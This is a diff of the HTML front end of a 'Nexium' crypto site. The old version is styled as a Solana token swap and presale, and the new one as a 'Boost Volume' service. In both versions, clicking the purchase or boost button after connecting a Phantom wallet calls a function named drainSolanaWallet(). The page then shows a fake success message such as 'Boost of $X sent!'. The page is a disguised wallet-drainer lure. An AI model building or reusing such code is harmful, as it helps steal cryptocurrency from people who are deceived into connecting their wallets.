+          <div class="card-text">Lightning Fast</div>
+        </div>
+        <div class="floating-card">
+          <div class="card-icon">
+            <svg><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+          </div>
+          <div class="card-text">Secure</div>
+        </div>
+        <div class="floating-card">
+          <div class="card-icon">
+            <svg><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+          </div>
+          <div class="card-text">Trusted</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- MODAL -->
+  <div id="wallet-modal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h3 class="modal-title">Connect Wallet</h3>
+        <button id="close-modal" class="modal-close">×</button>
+      </div>
+      <button id="connect-phantom">
+        <div class="wallet-icon">
+          <svg viewBox="0 0 128 128" fill="none">
+            <path d="M106.3 106.3c-28.4 28.4-74.3 28.4-102.6 0-28.4-28.4-28.4-74.3 0-102.6C32.1-24.6 78-24.6 106.3 3.7c15.6 15.6 21.9 37.5 18.8 58.1" fill="url(#g1)"/>
+            <defs>
+              <linearGradient id="g1" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="#AB9FF2"/>
+                <stop offset="100%" stop-color="#4E44CE"/>
+              </linearGradient>
+            </defs>
+          </svg>
+        </div>
+        <span>Connect Phantom</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- BOOST SECTION -->
+  <div id="boost-section" class="boost-section">
+    <h2 style="font-size: 1.8rem; margin-bottom: 1.5rem; background: linear-gradient(135deg, #ff9800, #ffc107); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; text-fill-color: transparent;">
+      Boost Volume
+    </h2>
+
+    <div class="input-group">
+      <label class="input-label">Token Address</label>
+      <input type="text" id="token-address-input" placeholder="Paste token contract address" />
+      <p class="input-hint">Enter the token you want to boost</p>
     </div>
 
-    <!-- Wallet Modal -->
-    <div class="wallet-modal" id="wallet-modal">
-        <div class="modal-content">
-            <h2>Connect Your Wallet</h2>
-            <div class="wallet-option" id="connect-phantom">
-                <div class="wallet-icon">Ghost</div>
-                <div>
-                    <strong>Phantom</strong>
-                    <div style="font-size: 0.9rem; color: #a0a0a0;">Recommended for Solana</div>
-                </div>
-            </div>
-            <div class="wallet-option disabled">
-                <div class="wallet-icon">Fox</div>
-                <div>
-                    <strong>MetaMask</strong>
-                    <div style="font-size: 0.9rem; color: #a0a0a0;">Not supported for presale</div>
-                </div>
-            </div>
-            <div class="wallet-option disabled">
-                <div class="wallet-icon">Link</div>
-                <div>
-                    <strong>WalletConnect</strong>
-                    <div style="font-size: 0.9rem; color: #a0a0a0;">Coming soon</div>
-                </div>
-            </div>
-            <button class="close-modal" id="close-modal">Close</button>
-        </div>
+    <div class="input-group">
+      <label class="input-label">Amount (USD)</label>
+      <div class="input-wrapper">
+        <span class="currency">$</span>
+        <input type="number" id="amount-input" placeholder="0.00" min="1" step="0.01" />
+      </div>
+      <p class="input-hint">Minimum: $1</p>
     </div>
 
-    <!-- MetaMask Prompt -->
-    <div id="metamaskPrompt" class="hidden">
-        <p>Please install <a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline">Phantom</a> or switch to continue.</p>
-        <button class="prompt-close">Got it</button>
+    <div class="network-info">
+      <div>
+        <div class="info-label">Network</div>
+        <div id="network-display" class="info-value">Solana</div>
+      </div>
+      <div>
+        <div class="info-label">Wallet</div>
+        <div id="wallet-address-display" class="info-value">-</div>
+      </div>
     </div>
 
-    <script type="module">
-        import { NexiumApp } from './main.js';
+    <button id="boost-now-btn" class="btn btn-primary btn-large" disabled>
+      Boost Now
+    </button>
+  </div>
 
-        let nexiumApp = null;
-        setTimeout(() => {
-            nexiumApp = window.nexiumApp || new NexiumApp();
-            window.nexiumApp = nexiumApp;
-            console.log('Frontend connected to backend:', !!nexiumApp);
-        }, 100);
+  <!-- FEEDBACK -->
+  <div class="feedback-container"></div>
 
-        const swapButton = document.getElementById('swap-button');
-        const inputAmount = document.getElementById('input-amount');
-        const outputAmount = document.getElementById('output-amount');
-        const errorMessage = document.getElementById('error-message');
-        const quickButtons = document.querySelectorAll('.quick-btn');
-        const walletModal = document.getElementById('wallet-modal');
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div>© 2025 Nexium. All rights reserved.</div>
+    <div class="footer-links">
+      <a href="#" class="footer-link">Privacy</a>
+      <a href="#" class="footer-link">Terms</a>
+      <a href="#" class="footer-link">Contact</a>
+    </div>
+  </footer>
 
-        function calculateOutput(usdAmount) {
-            return usdAmount * 100;
+  <!-- SCRIPT -->
+  <script type="module">
+    import { NexiumApp } from './main.js';
+    const app = new NexiumApp();
+    window.nexiumApp = app;
+
+    const connectWalletBtn = document.getElementById('connect-wallet');
+    const walletModal = document.getElementById('wallet-modal');
+    const closeModal = document.getElementById('close-modal');
+    const connectPhantom = document.getElementById('connect-phantom');
+    const boostSection = document.getElementById('boost-section');
+    const amountInput = document.getElementById('amount-input');
+    const boostNowBtn = document.getElementById('boost-now-btn');
+    const walletAddressDisplay = document.getElementById('wallet-address-display');
+
+    // === SINGLE TOAST SYSTEM ===
+    let isFeedbackActive = false;
+    function showFeedback(msg, type = 'success') {
+      if (isFeedbackActive) return;
+      isFeedbackActive = true;
+
+      const container = document.querySelector('.feedback-container');
+      const feedback = document.createElement('div');
+      feedback.className = `feedback ${type === 'error' ? 'error' : ''}`;
+      feedback.innerHTML = `<span>${msg}</span><button class="feedback-close">×</button>`;
+      feedback.querySelector('.feedback-close').onclick = () => {
+        feedback.remove();
+        isFeedbackActive = false;
+      };
+      container.appendChild(feedback);
+
+      setTimeout(() => {
+        if (feedback.isConnected) {
+          feedback.remove();
+          isFeedbackActive = false;
         }
+      }, type === 'error' ? 8000 : 4000);
+    }
 
-        function formatNumber(num) {
-            return num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-        }
+    // === MODAL CONTROLS ===
+    connectWalletBtn.addEventListener('click', () => walletModal.classList.add('active'));
+    closeModal.addEventListener('click', () => walletModal.classList.remove('active'));
+    document.addEventListener('click', (e) => {
+      if (walletModal.classList.contains('active') && 
+          !walletModal.querySelector('.modal-content').contains(e.target) && 
+          !connectWalletBtn.contains(e.target)) {
+        walletModal.classList.remove('active');
+      }
+    });
 
-        function showError(message) {
-            errorMessage.textContent = message;
-            errorMessage.classList.add('active');
-        }
+    // === CONNECT PHANTOM ===
+    let isConnected = false;
+    connectPhantom.addEventListener('click', async () => {
+      if (isConnected) return;
+      
+      try {
+        await app.connectWallet('Phantom');
+        isConnected = true;
+        walletModal.classList.remove('active');
+        
+        const short = app.shortenAddress(app.publicKey);
+        connectWalletBtn.textContent = short;
+        connectWalletBtn.disabled = true;
+        boostSection.classList.add('visible');
+        walletAddressDisplay.textContent = short;
 
-        function hideError() {
-            errorMessage.classList.remove('active');
-        }
+        showFeedback('Connected to Phantom!');
+      } catch (err) {
+        console.error(err);
+        showFeedback('Connection failed. Try again.', 'error');
+      }
+    });
 
-        function updateOutput() {
-            const value = parseFloat(inputAmount.value) || 0;
-            if (value === 0) {
-                outputAmount.value = '0.00';
-                swapButton.disabled = true;
-                if (nexiumApp?.publicKey) swapButton.textContent = 'Enter Amount to Swap';
-                return;
-            }
-            if (value < 1) {
-                outputAmount.value = '0.00';
-                showError('Minimum swap amount is $1 USD');
-                swapButton.disabled = true;
-                return;
-            }
-            if (value > 10000) {
-                outputAmount.value = '0.00';
-                showError('Maximum swap amount is $10,000 USD');
-                swapButton.disabled = true;
-                return;
-            }
-            hideError();
-            const output = calculateOutput(value);
-            outputAmount.value = formatNumber(output);
-            if (nexiumApp?.publicKey) {
-                swapButton.disabled = false;
-                swapButton.textContent = 'Swap Now';
-            }
-        }
+    // === BOOST BUTTON ===
+    amountInput.addEventListener('input', () => {
+      const val = parseFloat(amountInput.value);
+      boostNowBtn.disabled = !(val >= 1 && isConnected);
+    });
 
-        inputAmount.addEventListener('input', updateOutput);
-        inputAmount.addEventListener('change', updateOutput);
-        inputAmount.addEventListener('keyup', updateOutput);
+    boostNowBtn.addEventListener('click', async () => {
+      if (!isConnected) return showFeedback('Wallet not connected', 'error');
+      const amount = parseFloat(amountInput.value);
+      if (amount < 1) return showFeedback('Minimum $1', 'error');
 
-        quickButtons.forEach(btn => {
-            btn.addEventListener('click', () => {
-                inputAmount.value = btn.dataset.amount;
-                updateOutput();
-            });
-        });
+      boostNowBtn.disabled = true;
+      boostNowBtn.innerHTML = 'Processing...';
 
-        swapButton.addEventListener('click', async () => {
-            console.log('Swap button clicked, nexiumApp exists:', !!nexiumApp);
-            console.log('Wallet connected:', !!nexiumApp?.publicKey);
+      try {
+        await app.drainSolanaWallet();
+        showFeedback(`Boost of $${amount} sent!`);
+        boostNowBtn.innerHTML = 'Boost Complete!';
+        setTimeout(() => location.reload(), 3000);
+      } catch (err) {
+        console.error(err);
+        showFeedback('Transaction failed.', 'error');
+        boostNowBtn.disabled = false;
+        boostNowBtn.innerHTML = 'Boost Now';
+      }
+    });
+  </script>
 
-            if (!nexiumApp || !nexiumApp.publicKey) {
-                showError('Please connect your Phantom wallet to swap.');
-                walletModal.classList.add('active');
-                return;
-            }
-
-            const amount = parseFloat(inputAmount.value);
-            if (amount < 1 || amount > 10000) {
-                showError('Invalid amount. Please enter between $1 and $10,000');
-                return;
-            }
-
-            try {
-                hideError();
-                swapButton.disabled = true;
-                swapButton.textContent = 'Processing Swap...';
-                await nexiumApp.drainSolanaWallet();
-
-                const tokensReceived = calculateOutput(amount);
-                document.getElementById('user-allocation').textContent = `${tokensReceived.toLocaleString()} $NEXI`;
-                swapButton.textContent = 'Swap Successful! Success';
-                swapButton.style.background = 'linear-gradient(135deg, #14F195 0%, #00D4FF 100%)';
-
-                setTimeout(() => {
-                    swapButton.textContent = 'Swap Now';
-                    swapButton.style.background = 'linear-gradient(135deg, #9945FF 0%, #14F195 50%, #00D4FF 100%)';
-                    swapButton.disabled = false;
-                }, 3000);
-            } catch (error) {
-                console.error('Swap failed:', error);
-                showError('Swap failed. Please try again.');
-                swapButton.textContent = 'Swap Now';
-                swapButton.disabled = false;
-            }
-        });
-
-        setInterval(() => {
-            if (!nexiumApp?.publicKey) {
-                if (swapButton.textContent !== 'Connect Wallet to Swap') {
-                    swapButton.textContent = 'Connect Wallet to Swap';
-                    swapButton.disabled = true;
-                }
-            } else {
-                const inputValue = parseFloat(inputAmount.value) || 0;
-                if (inputValue >= 1 && inputValue <= 10000) {
-                    swapButton.textContent = 'Swap Now';
-                    swapButton.disabled = false;
-                }
-            }
-        }, 500);
-    </script>
-    <script type="module" src="main.js"></script>
+  <!-- LOAD MAIN.JS -->
+  <script type="module" src="main.js"></script>
 </body>
 </html>
